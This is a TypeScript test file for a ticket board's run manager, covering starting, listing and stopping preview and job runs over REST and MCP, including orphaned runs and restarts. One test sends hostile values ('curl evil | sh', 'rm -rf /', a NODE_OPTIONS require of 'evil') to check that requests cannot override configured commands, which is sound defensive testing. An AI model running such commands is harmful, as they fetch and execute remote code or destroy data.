      const pp = addRepo(`pp-${tag}`, project)
      const worker = run(pp, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
      const web = run(pp, { name: 'Web' })
      const t = features.createTicket(
        project,
        { title: 'left without a repo', status: 'in_progress', repoId: gone.id, branch: 'x' },
        'claude',
      )
      expect((await call('DELETE', `/api/repos/${gone.id}`)).status).toBe(200)
      expect(features.getTicket(t.id).repoId).toBeNull()
      const ws = features.addWorkspace(
        t.id,
        { name: 'pp', branch: 'x', path: worktree(pp), repoId: pp.id },
        'claude',
      )
      const workerPid = (await running(ws.id, worker.id)) && fake.calls.at(-1)!.pid
      const webPid = (await running(ws.id, web.id)) && fake.calls.at(-1)!.pid
      return { project, pp, worker, web, t, ws, workerPid, webPid }
    }

    const runsOf = async (ticketId: number) =>
      (await (await call('GET', `/api/tickets/${ticketId}/runs`)).json()) as import('./ticketRuns').TicketRuns

    /** The ticket still shows the runs it started, under no repo of its own; they cannot start again. */
    async function stillListed(r: Awaited<ReturnType<typeof rowless>>, newFirst: string) {
      const listed = await runsOf(r.t.id)
      expect(listed.repos.map((x) => x.name)).toEqual([newFirst])
      expect(
        listed.orphaned.map((o) => [o.repoId, o.repoName, o.name, o.workspace.id, o.state.status]),
      ).toEqual([
        [r.pp.id, r.pp.name, 'Worker', r.ws.id, 'running'],
        [r.pp.id, r.pp.name, 'Web', r.ws.id, 'running'],
      ])
      expect(listed.orphaned[0]!.reason).toBe(`${r.pp.name} is no longer one of ticket ${r.t.id}'s repos`)
      expect(listed.inUse).toBe(2)
      const restart = await call(
        'POST',
        `/api/workspaces/${r.ws.id}/runs/${r.worker.id}/restart`,
        undefined,
        'agent',
      )
      expect(restart.status).toBe(400)
      expect(await tool('start_run', { ticketId: r.t.id, run: 'Worker', restart: true })).toMatchObject({
        error: true,
      })
      expect(status(r.ws.id, r.worker.id)).toBe('running')
    }

    it('a repo added that sorts first: the ticket lists them and Stop all stops them', async () => {
      useFake()
      const r = await rowless('c')
      const main = path.join(code, 'aa-c')
      fs.mkdirSync(path.join(main, '.git'), { recursive: true })
      const created = await call(
        'POST',
        '/api/repos',
        { projectId: r.project, name: 'aa-c', repoPath: main },
        'agent',
      )
      expect(created.status).toBe(201)
      // Adding a repo stops nothing by itself.
      expect([status(r.ws.id, r.worker.id), status(r.ws.id, r.web.id)]).toEqual(['running', 'running'])
      await stillListed(r, 'aa-c')

      const stopped = await call('POST', `/api/tickets/${r.t.id}/runs/stop`, {}, 'agent')
      expect(stopped.status).toBe(200)
      const { results } = (await stopped.json()) as {
        results: { repoId: number; name: string; ok: boolean }[]
      }
      expect(results.map((x) => [x.repoId, x.name, x.ok])).toEqual([
        [r.pp.id, 'Worker', true],
        [r.pp.id, 'Web', true],
      ])
      expect(fake.killed).toEqual(expect.arrayContaining([r.workerPid, r.webPid]))
      expect(runs.activeRuns()).toEqual([])
      const after = await runsOf(r.t.id)
      expect([after.inUse, after.orphaned]).toEqual([0, []])
    })

    it('a repo renamed to sort first: the ticket lists them, stops one by name and the rest with Stop all', async () => {
      useFake()
      const r = await rowless('r')
      const zz = addRepo('zz-r', r.project)
      const renamed = await call('PATCH', `/api/repos/${zz.id}`, { name: 'aa-r' }, 'agent')
      expect(renamed.status).toBe(200)
      expect([status(r.ws.id, r.worker.id), status(r.ws.id, r.web.id)]).toEqual(['running', 'running'])
      await stillListed(r, 'aa-r')
      const listed = JSON.parse((await tool('list_runs', { ticketId: r.t.id })).text) as {
        orphaned: { name: string }[]
      }
      expect(listed.orphaned.map((o) => o.name)).toEqual(['Worker', 'Web'])

      // stop_run by name, any casing, then Stop all over MCP for the rest.
      const one = await tool('stop_run', { ticketId: r.t.id, run: 'worker' })
      expect(one.error).toBe(false)
      expect(JSON.parse(one.text)).toMatchObject({ status: 'stopped', runName: 'Worker' })
      expect(fake.killed).toContain(r.workerPid)
      expect(status(r.ws.id, r.web.id)).toBe('running')
      const rest = await tool('stop_run', { ticketId: r.t.id, all: true })
      expect(JSON.parse(rest.text).results.map((x: { name: string }) => x.name)).toEqual(['Web'])
      expect(fake.killed).toContain(r.webPid)
      expect(runs.activeRuns()).toEqual([])
      expect((await runsOf(r.t.id)).inUse).toBe(0)
      // Nothing of it runs any more: a stop by name is refused again, naming the ticket's repos.
      expect(await tool('stop_run', { ticketId: r.t.id, run: 'Worker' })).toMatchObject({
        error: true,
        text: expect.stringMatching(/no run Worker in aa-r/),
      })
    })

    it('Stop all of the old repo by repoId stops them; a repo of neither is still refused', async () => {
      useFake()
      const r = await rowless('i')
      const zz = addRepo('zz-i', r.project)
      expect((await call('PATCH', `/api/repos/${zz.id}`, { name: 'aa-i' }, 'agent')).status).toBe(200)
      const other = addRepo('qq-i', r.project)
      const refused = await call('POST', `/api/tickets/${r.t.id}/runs/stop`, { repoId: other.id }, 'agent')
      expect(refused.status).toBe(400)
      expect(status(r.ws.id, r.worker.id)).toBe('running')
      const stopped = await call('POST', `/api/tickets/${r.t.id}/runs/stop`, { repoId: r.pp.id }, 'agent')
      expect(stopped.status).toBe(200)
      expect(((await stopped.json()) as { results: unknown[] }).results).toHaveLength(2)
      expect(runs.activeRuns()).toEqual([])
    })

    it('stop_run stops one orphaned run going from two worktrees of its repo, by name or by id', async () => {
      useFake()
      const r = await rowless('two')
      const ws2 = features.addWorkspace(
        r.t.id,
        { name: 'pp2', branch: 'y', path: worktree(r.pp), repoId: r.pp.id },
        'claude',
      )
      const worker2 = (await running(ws2.id, r.worker.id)) && fake.calls.at(-1)!.pid
      const web2 = (await running(ws2.id, r.web.id)) && fake.calls.at(-1)!.pid
      addRepo('aa-two', r.project)
      expect((await runsOf(r.t.id)).orphaned.map((o) => [o.name, o.workspace.id])).toEqual([
        ['Worker', r.ws.id],
        ['Web', r.ws.id],
        ['Worker', ws2.id],
        ['Web', ws2.id],
      ])

      // By name: Worker goes from both, Web from neither.
      const byName = await tool('stop_run', { ticketId: r.t.id, run: 'Worker' })
      expect(byName.error).toBe(false)
      expect(JSON.parse(byName.text)).toMatchObject({ status: 'stopped', runName: 'Worker' })
      expect(fake.killed).toEqual(expect.arrayContaining([r.workerPid, worker2]))
      expect([status(r.ws.id, r.worker.id), status(ws2.id, r.worker.id)]).toEqual(['stopped', 'stopped'])
      expect([status(r.ws.id, r.web.id), status(ws2.id, r.web.id)]).toEqual(['running', 'running'])

      // By id with its repo: Web from both.
      const byId = await tool('stop_run', { ticketId: r.t.id, run: r.web.id, repoId: r.pp.id })
      expect(byId.error).toBe(false)
      expect(JSON.parse(byId.text)).toMatchObject({ status: 'stopped', runId: r.web.id })
      expect(fake.killed).toEqual(expect.arrayContaining([r.webPid, web2]))
      expect(runs.activeRuns()).toEqual([])
      expect((await runsOf(r.t.id)).orphaned).toEqual([])
    })

    it('stop_run refuses a name orphaned runs of two repos share, naming the repos', async () => {
      useFake()
      const r = await rowless('rr')
      // aa sorts first: pp's runs are orphaned, and the ticket runs aa's Worker; then a0 orphans aa's.
      const aa = addRepo('aa-rr', r.project)
      const aaWorker = run(aa, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
      const wsA = features.addWorkspace(
        r.t.id,
        { name: 'aa', branch: 'x', path: worktree(aa), repoId: aa.id },
        'claude',
      )
      const aaPid = (await running(wsA.id, aaWorker.id)) && fake.calls.at(-1)!.pid
      addRepo('a0-rr', r.project)
      expect((await runsOf(r.t.id)).orphaned.map((o) => [o.repoName, o.name])).toEqual([
        [r.pp.name, 'Worker'],
        [r.pp.name, 'Web'],
        [aa.name, 'Worker'],
      ])

      expect(await tool('stop_run', { ticketId: r.t.id, run: 'worker' })).toEqual({
        error: true,
        text: `2 repos that are no longer the ticket's have a run named worker going (${r.pp.id} ${r.pp.name}, ${aa.id} ${aa.name}): give repoId, or stop them all`,
      })
      expect([status(r.ws.id, r.worker.id), status(wsA.id, aaWorker.id)]).toEqual(['running', 'running'])
      const one = await tool('stop_run', { ticketId: r.t.id, run: 'Worker', repoId: aa.id })
      expect(JSON.parse(one.text)).toMatchObject({ status: 'stopped', runId: aaWorker.id })
      expect(fake.killed).toContain(aaPid)
      expect(fake.killed).not.toContain(r.workerPid)
      expect(status(r.ws.id, r.worker.id)).toBe('running')
    })

    it("stop_run refuses a name two of the ticket's own repos share, though an orphaned run has it too", async () => {
      useFake()
      const r = await rowless('own')
      const aa = addRepo('aa-own', r.project)
      const qq = addRepo('qq-own', r.project)
      run(aa, { name: 'Web' })
      const qqWeb = run(qq, { name: 'Web' })
      const set = await call('PATCH', `/api/tickets/${r.t.id}`, {
        repos: [{ repoId: aa.id }, { repoId: qq.id }],
      })
      expect(set.status).toBe(200)
      const wsQ = features.addWorkspace(
        r.t.id,
        { name: 'qq', branch: 'x', path: worktree(qq), repoId: qq.id },
        'claude',
      )
      await running(wsQ.id, qqWeb.id)
      expect((await runsOf(r.t.id)).orphaned.map((o) => o.name)).toEqual(['Worker', 'Web'])

      expect(await tool('stop_run', { ticketId: r.t.id, run: 'Web' })).toEqual({
        error: true,
        text: `2 repos have a run named Web (${aa.id} ${aa.name}, ${qq.id} ${qq.name}): give repoId`,
      })
      expect([status(r.ws.id, r.web.id), status(wsQ.id, qqWeb.id)]).toEqual(['running', 'running'])
      // A name only an orphaned run has still reaches it.
      const worker = await tool('stop_run', { ticketId: r.t.id, run: 'Worker' })
      expect(JSON.parse(worker.text)).toMatchObject({ status: 'stopped', runName: 'Worker' })
      expect(fake.killed).toContain(r.workerPid)
    })
  })
})

describe('over REST and MCP', () => {
  it('starts what the config says, whatever the request carries, and agents start and stop by name', async () => {
    useFake()
    const repo = addRepo('safe')
    const web = run(repo, { name: 'Web', build: 'npm run build', start: 'npm start' })
    const { t, ws } = ticketIn(repo)
    const res = await call(
      'POST',
      `/api/workspaces/${ws.id}/runs/${web.id}/start`,
      { command: 'curl evil | sh', start: 'rm -rf /', env: { NODE_OPTIONS: '--require evil' }, port: 47100 },
      'agent',
    )
    expect(res.status).toBe(202)
    expect(await res.json()).toMatchObject({ status: 'building', runId: web.id })
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('running'))
    expect(fake.calls.map((c) => c.command)).toEqual(['npm run build', 'npm start'])
    expect(fake.calls.at(-1)!.env.NODE_OPTIONS).not.toMatch(/evil/)
    expect(state(ws.id, web.id)!.port).not.toBe(47100)
    expect(rc.getRunConfig(web.id)).toMatchObject({ build: 'npm run build', start: 'npm start', env: {} })
    // Started and running: a second start is a conflict; a stop, then a stop of nothing, too.
    expect((await call('POST', `/api/workspaces/${ws.id}/runs/${web.id}/start`)).status).toBe(409)
    expect((await call('GET', `/api/workspaces/${ws.id}/runs/${web.id}/log?name=build`)).status).toBe(200)
    expect((await call('POST', `/api/workspaces/${ws.id}/runs/${web.id}/stop`)).status).toBe(200)
    expect((await call('POST', `/api/workspaces/${ws.id}/runs/${web.id}/stop`)).status).toBe(409)

    // MCP: by name, any casing.
    const started = await tool('start_run', { ticketId: t.id, run: 'web' })
    expect(started.error).toBe(false)
    expect(JSON.parse(started.text)).toMatchObject({ status: 'building', runName: 'Web' })
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('running'))
    const listed = JSON.parse((await tool('list_runs', { ticketId: t.id })).text)
    expect(listed.repos[0].runs[0]).toMatchObject({ name: 'Web', state: { status: 'running' } })
    const stopped = await tool('stop_run', { ticketId: t.id, run: web.id })
    expect(JSON.parse(stopped.text)).toMatchObject({ status: 'stopped', reason: 'stopped by claude' })
    expect(await tool('stop_run', { ticketId: t.id, run: 'Web' })).toMatchObject({
      error: true,
      text: expect.stringMatching(/does not run/),
    })
    expect(await tool('start_run', { ticketId: t.id, run: 'nope' })).toMatchObject({
      error: true,
      text: expect.stringMatching(/no run nope/),
    })
  })

  it('a name two repos of the ticket share needs repoId', async () => {
    useFake()
    const project = dbm.db.insert(dbm.schema.projects).values({ name: 'shared names' }).returning().get().id
    const a = addRepo('one', project)
    const b = addRepo('two', project)
    run(a, { name: 'Web' })
    const bWeb = run(b, { name: 'Web' })
    const t = features.createTicket(
      project,
      { title: 'shared', status: 'in_progress', repos: [{ repoId: a.id }, { repoId: b.id }] },
      'claude',
    )
    features.addWorkspace(t.id, { name: 'two', path: worktree(b), repoId: b.id }, 'claude')
    expect(await tool('start_run', { ticketId: t.id, run: 'Web' })).toMatchObject({
      error: true,
      text: expect.stringMatching(
        new RegExp(`2 repos have a run named Web \\(${a.id} one, ${b.id} two\\): give repoId`),
      ),
    })
    const ok = await tool('start_run', { ticketId: t.id, run: 'Web', repoId: b.id })
    expect(JSON.parse(ok.text)).toMatchObject({ status: 'building', runId: bWeb.id })
  })

  it('start_preview says so when the repo has no preview run', async () => {
    useFake()
    const repo = addRepo('no-preview')
    const { ws } = ticketIn(repo)
    expect(await tool('start_preview', { workspaceId: ws.id })).toMatchObject({
      error: true,
      text: expect.stringMatching(/repo has no preview run/),
    })
    const rest = await call('POST', `/api/workspaces/${ws.id}/preview/start`)
    expect(rest.status).toBe(400)
  })
})

// Last: this loads the module afresh, as a restarted board would.
describe('one run going from two worktrees of a repo of the ticket', () => {
  async function twice(tag: string) {
    const repo = addRepo(`twice-${tag}`)
    const web = run(repo, { name: 'Web' })
    const { t, ws } = ticketIn(repo, { branch: 'feat' })
    const ws2 = features.addWorkspace(t.id, { name: 'wt2', branch: 'other', path: worktree(repo) }, 'claude')
    for (const w of [ws, ws2]) {
      const started = await call('POST', `/api/workspaces/${w.id}/runs/${web.id}/start`, {}, 'agent')
      expect(started.status).toBe(202)
      await vi.waitFor(() => expect(status(w.id, web.id)).toBe('running'))
    }
    const listed = (await (await call('GET', `/api/tickets/${t.id}/runs`)).json()) as TicketRunsView
    const row = listed.repos[0]!.runs[0]!
    const other = row.workspaceId === ws.id ? ws2 : ws
    return { repo, web, t, ws, ws2, listed, row, other }
  }
  type TicketRunsView = import('./ticketRuns').TicketRuns

  it('lists the one its row does not show under alsoRunning, with its workspace and link', async () => {
    useFake()
    const r = await twice('list')
    expect(r.row.state?.status).toBe('running')
    expect(r.listed.orphaned).toEqual([])
    expect(
      r.listed.alsoRunning.map((o) => [o.repoId, o.runId, o.name, o.workspace.id, o.state.status]),
    ).toEqual([[r.repo.id, r.web.id, 'Web', r.other.id, 'running']])
    const also = r.listed.alsoRunning[0]!
    expect(also.state.url).toBe(state(r.other.id, r.web.id)!.url)
    expect(also.reason).toBe(
      `Web of ${r.repo.name} also goes from workspace ${r.other.name}; its row shows workspace ${r.row.workspaceId === r.ws.id ? r.ws.name : r.ws2.name}`,
    )
    // list_runs says the same.
    const viaMcp = JSON.parse((await tool('list_runs', { ticketId: r.t.id })).text) as TicketRunsView
    expect(viaMcp.alsoRunning.map((o) => o.workspace.id)).toEqual([r.other.id])
  })

  it('stop_run by name stops it from both worktrees', async () => {
    useFake()
    const r = await twice('name')
    const stopped = await tool('stop_run', { ticketId: r.t.id, run: 'web' })
    expect(stopped.error).toBe(false)
    // The answer is the run its row shows.
    expect(JSON.parse(stopped.text)).toMatchObject({
      status: 'stopped',
      workspaceId: r.row.workspaceId,
      runId: r.web.id,
    })
    expect([status(r.ws.id, r.web.id), status(r.ws2.id, r.web.id)]).toEqual(['stopped', 'stopped'])
    const after = (await (await call('GET', `/api/tickets/${r.t.id}/runs`)).json()) as TicketRunsView
    expect(after.alsoRunning).toEqual([])
    expect(runs.activeRuns()).toEqual([])
  })

  it('Stop all stops both', async () => {
    useFake()
    const r = await twice('all')
    const stopped = await call('POST', `/api/tickets/${r.t.id}/runs/stop`, {}, 'agent')
    expect(stopped.status).toBe(200)
    const { results } = (await stopped.json()) as { results: { workspaceId: number; ok: boolean }[] }
    expect(results.map((x) => [x.workspaceId, x.ok]).sort()).toEqual(
      [
        [r.ws.id, true],
        [r.ws2.id, true],
      ].sort(),
    )
    expect(runs.activeRuns()).toEqual([])
  })
})

describe('after a restart', () => {
  it('a preview remembered from before runs were configurable is its default run’s, stopped', async () => {
    const repo = addRepo('agent-board-legacy')
    fs.writeFileSync(path.join(repo.main, 'package.json'), JSON.stringify({ name: 'agent-board' }))
    const { ws, dir } = ticketIn(repo)
    // previews.json as the board wrote it before: one entry per workspace, no run.
    const file = path.join(process.env.DATA_DIR!, 'previews.json')
    const legacy = {
      workspaceId: ws.id,
      ticketId: ws.ticketId,
      status: 'running',
      step: null,
      port: 47123,
      pid: 4242,
      url: 'http://127.0.0.1:47123',
      startedAt: '2026-10-20T10:00:00.000Z',
      runningAt: '2026-10-20T10:01:00.000Z',
      stoppedAt: null,
      reason: null,
      tail: [],
      tailLog: null,
      path: dir,
      logs: {
        build: path.join(dir, 'data', 'preview', 'logs', 'build.log'),
        server: path.join(dir, 'data', 'preview', 'logs', 'server.log'),
      },
      dataDir: path.join(dir, 'data', 'preview'),
    }
    fs.writeFileSync(file, JSON.stringify([legacy]))
    features.setWorkspacePreview(ws.id, legacy.url, 'board')

    delete (globalThis as Record<symbol, unknown>)[runs.KEPT]
    vi.resetModules()
    const fresh = await import('./runs')
    const after = new FakeRunner()
    fresh.setPreviewRunner(after)
    const mp = await import('./managedPreview')
    const preview = mp.previewRunOf(ws.id)!
    expect(preview).toMatchObject({ name: 'Preview', type: 'preview' })
    expect(fresh.runState(ws.id, preview.id)).toMatchObject({
      status: 'stopped',
      reason: 'stopped when the board restarted',
      runName: 'Preview',
      url: null,
      port: null,
    })
    expect(mp.managedPreview(ws.id)).toMatchObject({ status: 'stopped', reason: mp.RESTARTED })
    expect(wsRow(ws.id).previewUrl).toBe('')
    expect(after.calls).toEqual([])
  })
})

describe('on the work timeline', () => {
  it("records a preview run's states under its name, and nothing of a job", async () => {
    useFake()
    const repo = addRepo('timeline')
    const web = run(repo, { name: 'Web' })
    const worker = run(repo, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const { t, ws } = ticketIn(repo)
    const s = await running(ws.id, web.id)
    await running(ws.id, worker.id)
    await runs.stopRun(ws.id, web.id, 'stopped by claude', 'claude')
    await runs.stopRun(ws.id, worker.id, 'stopped by claude', 'claude')
    const notes = dbm.db
      .select()
      .from(dbm.schema.ticketEvents)
      .where(eq(dbm.schema.ticketEvents.ticketId, t.id))
      .all()
      .filter((e) => e.kind === 'preview')
      .map((e) => [e.note, e.agent])
    expect(notes).toEqual([
      ['Web building', 'board'],
      [`Web running ${s.url}`, 'board'],
      ['Web stopped: stopped by claude', 'board'],
    ])
  })
})
